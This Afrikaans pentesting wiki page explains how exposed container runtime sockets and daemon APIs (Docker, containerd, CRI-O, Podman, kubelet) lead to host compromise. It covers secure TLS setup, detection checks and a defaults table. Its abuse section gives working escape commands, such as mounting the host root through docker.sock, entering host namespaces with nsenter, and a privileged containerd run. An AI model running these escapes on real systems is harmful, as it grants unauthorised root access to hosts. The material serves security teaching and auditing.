# Runtime API en Daemon Blootstelling

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Baie werklike container-kompromitteerings begin glad nie met ’n namespace-ontsnapping nie. Dit begin met toegang tot die runtime-beheervlak. As ’n workload met `dockerd`, `containerd`, CRI-O, Podman, of kubelet kan kommunikeer deur ’n gemonteerde Unix-sok of ’n blootgestelde TCP-luisteraar, kan die aanvaller dalk ’n nuwe container versoek met beter voorregte, die host-lêerstelsel monteer, by host-namespaces aansluit, of sensitiewe node-inligting bekom. In daardie gevalle is die runtime API die werklike sekuriteitsgrens, en om dit te kompromitteer is funksioneel naby daaraan om die host te kompromitteer.

Hierom moet runtime-sokblootstelling apart gedokumenteer word van kernel-beskermings. ’n Container met gewone seccomp, capabilities, en MAC confinement kan nog steeds net een API-oproep van host-kompromittering af wees as `/var/run/docker.sock` of `/run/containerd/containerd.sock` daarin gemonteer is. Die kernel-isolasie van die huidige container kan presies werk soos ontwerp terwyl die runtime-bestuursvlak steeds volledig blootgestel bly.

## Daemon Toegangsmodelle

Docker Engine openbaar tradisioneel sy bevoorregte API via die plaaslike Unix-sok by `unix:///var/run/docker.sock`. Histories is dit ook op afstand blootgestel deur TCP-luisteraars soos `tcp://0.0.0.0:2375` of ’n TLS-beskermde luisteraar op `2376`. Om die daemon op afstand bloot te stel sonder sterk TLS en kliënt-verifikasie verander effektief die Docker API in ’n remote root-koppelvlak.

containerd, CRI-O, Podman, en kubelet openbaar soortgelyke hoog-impak oppervlaktes. Die name en workflows verskil, maar die logika nie. As die koppelvlak die oproeper toelaat om workloads te skep, host-paaie te monteer, credentials te herwin, of lopende containers te verander, is die koppelvlak ’n bevoorregte bestuur-kanaal en moet dit as sodanig behandel word.

Gereelde lokale paaie om te kontroleer is:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ouer of meer gespesialiseerde stacks kan ook eindpunte blootstel soos `dockershim.sock`, `frakti.sock`, of `rktlet.sock`. Dit is minder algemeen in moderne omgewings, maar wanneer dit teëgekom word, moet hulle met dieselfde omsigtigheid behandel word omdat dit runtime-beheeroppervlakke verteenwoordig eerder as gewone toepassings-sokette.

## Veilige Afstandstoegang

As 'n daemon buite die plaaslike soket blootgestel moet word, moet die verbinding met TLS beskerm word en verkieslik met wederkerige verifikasie sodat die daemon die kliënt verifieer en die kliënt die daemon verifieer. Die ou gewoonte om die Docker daemon op gewone HTTP oop te maak vir gerief is een van die gevaarlikste foute in containeradministrasie, omdat die API-oppervlakte sterk genoeg is om direk bevoorregte containers te skep.

Die historiese Docker-konfigurasiepatroon het soos volg gelyk:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Op systemd-gebaseerde gashere kan daemon-kommunikasie ook verskyn as `fd://`, wat beteken dat die proses 'n vooraf geopen socket van systemd erf in plaas daarvan om dit self direk te bind. Die belangrike les is nie die presiese sintaksis nie, maar die sekuriteitsgevolg. Sodra die daemon verder luister as 'n streng gemagtigde plaaslike socket, word transport security en client authentication verpligtend in plaas van opsionele verharding.

## Abuse

As 'n runtime-socket teenwoordig is, bevestig watter een dit is, of 'n verenigbare kliënt bestaan, en of rou HTTP- of gRPC-toegang moontlik is:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle onderskei tussen 'n dooie pad, 'n gemounte maar ontoeganklike socket, en 'n lewende bevoorregte API. As die client sukses behaal, is die volgende vraag of die API 'n nuwe container kan begin met 'n host bind mount of host namespace sharing.

### Volledige voorbeeld: Docker Socket To Host Root

As `docker.sock` bereikbaar is, is die klassieke escape om 'n nuwe container te begin wat die host root filesystem mount en dan `chroot` daarin:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dit bied direkte uitvoering as root op die gasheer deur die Docker daemon. Die impak is nie tot lêerlees beperk nie. Sodra die aanvaller in die nuwe container is, kan hy lêers op die gasheer verander, kredensiale insamel, persistensie implanteer, of bykomende geprivilegieerde werkladinge begin.

### Volledige voorbeeld: Docker Socket To Host Namespaces

Indien die aanvaller liewer namespace-toegang verkies in plaas van slegs lêerstelseltoegang:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Hierdie pad bereik die host deur die runtime te vra om 'n nuwe container te skep met eksplisiete host-namespace blootstelling in plaas daarvan om die huidige een te exploit.

### Volledige voorbeeld: containerd Socket

'n gemonteerde `containerd` socket is gewoonlik net so gevaarlik:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Die impak is weer 'n kompromittering van die gasheer. Selfs al is Docker-spesifieke gereedskap afwesig, kan 'n ander runtime API steeds dieselfde administratiewe mag bied.

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die container enige bestuursvlak kan bereik wat buite die vertrouensgrens moes gebly het.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Wat hier interessant is:

- 'n Gemounte runtime-sok is gewoonlik 'n direkte administratiewe primitief eerder as slegs inligtingsblootstelling.
- 'n TCP-listener op `2375` sonder TLS moet as 'n remote-compromise-toestand beskou word.
- Omgewingsveranderlikes soos `DOCKER_HOST` openbaar dikwels dat die workload doelbewus ontwerp is om met die host runtime te kommunikeer.

## Standaardinstellings vir runtime

| Runtime / platform | Standaardstatus | Standaardgedrag | Algemene manuele verzwakking |
| --- | --- | --- | --- |
| Docker Engine | Plaaslike Unix-sok standaard | `dockerd` luister op die plaaslike sok en die daemon is gewoonlik rootful | montering van `/var/run/docker.sock`, blootstelling van `tcp://...:2375`, swak of ontbrekende TLS op `2376` |
| Podman | CLI sonder daemon standaard | Geen langlewende geprivilegieerde daemon is benodig vir gewone plaaslike gebruik nie; API-sokke kan steeds blootgestel word wanneer `podman system service` aangeskakel is | blootstelling van `podman.sock`, die diens wyer laat loop, rootful API-gebruik |
| containerd | Plaaslike geprivilegieerde sok | Administratiewe API blootgestel deur die plaaslike sok en gewoonlik verbruik deur hoërvlak gereedskap | montering van `containerd.sock`, wye `ctr` of `nerdctl` toegang, blootstelling van geprivilegieerde namespaces |
| CRI-O | Plaaslike geprivilegieerde sok | CRI-endpunt is bedoel vir node-lokale betroubare komponente | montering van `crio.sock`, blootstelling van die CRI-endpunt aan onbetroubare workloads |
| Kubernetes kubelet | Node-lokale bestuurs-API | Kubelet moet nie wyd bereikbaar wees vanaf Pods nie; toegang kan podstatus, credentials, en uitvoeringskenmerke blootstel afhangende van authn/authz | montering van kubelet-sokke of sertifikate, swak kubelet-auth, host networking plus bereikbare kubelet-endpunt |
{{#include ../../../banners/hacktricks-training.md}}
